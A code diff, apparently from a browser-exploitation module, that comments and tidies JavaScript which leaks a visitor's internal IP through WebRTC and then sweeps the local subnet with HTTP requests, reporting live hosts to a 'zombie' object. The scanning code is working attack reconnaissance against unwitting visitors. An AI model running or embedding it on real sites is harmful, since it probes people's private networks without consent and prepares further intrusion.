@@ -52,6 +52,7 @@ Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
         setTimeout(function(){
             var lines = pc.localDescription.sdp.split('\n');
             var linec = 0;
+            //helps to break out of foreach once internal ip is found/ don't need public
             var BreakException= {};
             try{
               lines.forEach(function(line){
@@ -63,18 +64,16 @@ Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
             }
             catch(e){
               if(e!= BreakException) throw e;
+              //go scan once received local ip
               return resolve(linec);
             }
 
 
-            /*lines.forEach(function(line){
-              if(line.indexOf('a=candidate:')===0)
-                resolve(line);
-            });*/
+
         },1000);
   });
 
-  //var ran =0;
+
   function scan(candidate){
     var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
     var ip_addr = ip_regex.exec(candidate);
@@ -84,7 +83,7 @@ Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
       var start =0;
       var end = 255;
 
-      //ran =1;
+
       var controller = setInterval(function(){
 
         var url = 'http://'+net+start+'/';
@@ -97,9 +96,9 @@ Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
         if(start==end)
           clearInterval(controller);
         start++;
-        console.log(start);
 
       },timeout);
+      //promise that will resolve to clearInterval for portscan
       return Promise.resolve((function(controller){return function clear(){clearInterval(controller);}})(controller));
 
 
@@ -118,5 +117,5 @@ Utilizing Daniel Roesler's POC for WebRTC nat'd IP address retrieval
         window.zombie.update({'host':url});
       }
   }
-
+//return new promise
   return promise.then(scan);
